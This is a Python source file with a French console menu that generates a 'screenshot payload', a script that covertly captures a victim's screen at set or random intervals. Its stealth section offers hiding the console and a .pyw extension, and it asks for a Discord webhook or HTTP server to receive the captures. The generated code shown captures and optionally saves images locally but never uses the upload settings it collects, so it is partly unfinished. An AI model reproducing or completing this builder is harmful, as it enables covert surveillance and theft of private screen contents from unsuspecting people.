import os
from colorama import Fore, Style, init
import time
init(autoreset=True)

def clear():
    os.system("cls")

def affichage_screenshot():
    clear()
    print(Fore.CYAN + "=== Configuration Screenshot ===\n")
    print(f"""
{Fore.YELLOW}--- Fréquence & timing ---
{Fore.WHITE}
1.  Mode de capture (unique / périodique / démarrage)
2.  Intervalle de capture (secondes / random)
3.  Nombre maximum de captures
4.  Délai avant première capture

{Fore.YELLOW}--- Stockage ---
{Fore.WHITE}
5. Sauvegarde locale (chemin)
{Fore.YELLOW}--- Envoi ---
{Fore.WHITE}
6. Envoi sur Discord
7. Envoi sur serveur HTTP
8. Mode envoi (une seule / multiple)

{Fore.YELLOW}--- Logs ---
{Fore.WHITE}
9. Activer logs
{Fore.YELLOW}--- Furtivité ---
{Fore.WHITE}
10. Masquer la console
11. Nom de fichier aléatoire
{Fore.GREEN}
Tapez : set <num> pour configurer
Tapez : show pour afficher la config
Tapez : create pour générer
Tapez : exit pour quitter
""")
    
def screenshot_module():
    clear()
    affichage_screenshot()
    choix = {
        "Intervalle de capture": 300,
        "Nombre maximum de captures": None,
        "Délai avant première capture": 0,
        "Sauvegarde locale": None,
        "Envoi sur Discord": None,
        "Envoi sur serveur HTTP": None,
        "Mode envoi": None,
        "Activer logs": None,
        "Masquer la console": None,
        "Nom de fichier aléatoire": None,
    }

    def mode_capture_option():
        clear()
        mode = input("Entrez le mode de capture (unique / périodique / démarrage) : ")
        choix["Mode de capture"] = mode

    def intervalle_capture_option():
        clear()
        intervalle = input("Entrez l'intervalle de capture en secondes ('random' pour aléatoire) (5 minutes par défaut): ")
        choix["Intervalle de capture"] = intervalle

    def nombre_max_captures_option():
        clear()
        nombre = input("Entrez le nombre maximum de captures : ")
        choix["Nombre maximum de captures"] = int(nombre)

    def delai_premiere_capture_option():
        clear()
        delai = input("Entrez le délai avant la première capture en secondes : ")
        choix["Délai avant première capture"] = int(delai)

    def sauvegarde_locale_option():
        clear()
        print("Si activé, pour recevoir les captures vous allez devoir configurer un serveur HTTP ou un webhook Discord. et parametrer les options d'envoi.")
        chemin = input("Entrez le chemin de sauvegarde locale (C:/path/to/save/): ")
        choix["Sauvegarde locale"] = chemin

    def envoi_discord_option():
        clear()
        discord = input("Entrez l'URL du webhook Discord : ")
        choix["Envoi sur Discord"] = discord
        controle()

    def envoi_http_option():
        clear()
        http = input("Entrez l'URL du serveur HTTP : ")
        choix["Envoi sur serveur HTTP"] = http
        controle()

    def mode_envoi_option():
        clear()
        mode = input("Voulez-vous envoyer les captures au bout de combien de capture : ")
        try:
            choix["Mode envoi"] = int(mode)
        except ValueError:
            print(Fore.RED + "Veuillez entrer un nombre valide." + Style.RESET_ALL)
            time.sleep(2)
            choix["Mode envoi"] = None

    def activer_logs_option():
        clear()
        logs = input("Activer les logs ? (oui/non) : ")
        if logs.lower() == "oui":
            choix["Activer logs"] = True
        else:
            choix["Activer logs"] = None

    def masquer_console_option():
        clear()
        masquer = input("Masquer la console ? (oui/non) : ")
        if masquer.lower() == "oui":
            choix["Masquer la console"] = True
        else:
            choix["Masquer la console"] = None

    def nom_fichier_aleatoire_option():
        clear()
        aleatoire = input("Nom de fichier aléatoire ? (oui/non) : ")
        if aleatoire.lower() == "oui":
            choix["Nom de fichier aléatoire"] = ".pyw"
        else:
            choix["Nom de fichier aléatoire"] = ".py"

    def controle():
        clear()
        if choix["Envoi sur Discord"] and choix["Envoi sur serveur HTTP"]:
            print(Fore.RED + "Erreur : Choisissez un seul mode d'envoi (Discord ou HTTP)." + Style.RESET_ALL)
            time.sleep(2)
            choix["Envoi sur Discord"] = None
            choix["Envoi sur serveur HTTP"] = None
        else:
            return True
        


    

    def create_payload():
        clear()
        print(Fore.GREEN + "Création du payload Screenshot avec la configuration suivante :" + Style.RESET_ALL)
        filename = f"screenshot_payload{choix['Nom de fichier aléatoire']}"
        
        sauvegarde_code = ""
        if choix['Sauvegarde locale']:
            sauvegarde_code = f"            image.save(os.path.join(r'{choix['Sauvegarde locale']}', f'screenshot_{{{{int(time.time())}}}}.png'))"
        
        code = f"""
import time
import os
from PIL import ImageGrab
import requests
import random
import io

def take_screenshot():
    try:
        time.sleep({choix['Délai avant première capture']})
        for _ in range({choix['Nombre maximum de captures']}):
            image = ImageGrab.grab()
            buffer = io.BytesIO()
            image.save(buffer, format="PNG")
            buffer.seek(0)
{sauvegarde_code}
            time.sleep({choix['Intervalle de capture']})
    except Exception as e:
        print(f"Erreur lors de la capture d'écran : {{{{e}}}}")
        return None

take_screenshot()
"""
        
        with open(filename, "w") as f:
            f.write(code)
        
        print(Fore.GREEN + f"Payload créé : {filename}" + Style.RESET_ALL)

    while True:
        cmd = input(Fore.GREEN + ">> " + Style.RESET_ALL)
        if cmd.lower() == "exit":
            break
        if cmd.lower().startswith("set"):
            try:
                option_num = int(cmd.split()[1])
                if option_num in range(1, 12):
                    option_funcs = {
                        1: mode_capture_option,
                        2: intervalle_capture_option,
                        3: nombre_max_captures_option,
                        4: delai_premiere_capture_option,
                        5: sauvegarde_locale_option,
                        6: envoi_discord_option,
                        7: envoi_http_option,
                        8: mode_envoi_option,
                        9: activer_logs_option,
                        10: masquer_console_option,
                        11: nom_fichier_aleatoire_option,
                    }
                    option_funcs[option_num]()
                else:
                    print(Fore.RED + "Numéro d'option invalide." + Style.RESET_ALL)
            except ValueError:
                print(Fore.RED + "Veuillez saisir 'set'" + Style.RESET_ALL)

        if cmd.lower() == "show":
            print("\nConfiguration actuelle du module Screenshot :")
            for key, value in choix.items():
                print(f"{key}: {value}")

        if cmd.lower() == "create":
            create_payload()
            break

if __name__ == "__main__":  
    screenshot_module()
